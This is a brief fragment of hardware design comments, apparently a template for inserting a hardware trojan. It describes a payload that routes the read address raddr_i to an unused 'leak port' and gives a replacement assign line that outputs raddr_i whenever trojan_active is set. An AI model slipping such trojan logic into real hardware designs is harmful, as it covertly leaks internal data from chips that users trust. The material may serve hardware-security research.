 ...
 * Payload: Route raddr_i to leak port
 * 
...
// ============================================================
// Information Leak: Route raddr_i to unused output
//
...
//   Replace: assign output_signal = trojan_active ? raddr_i : normal_value;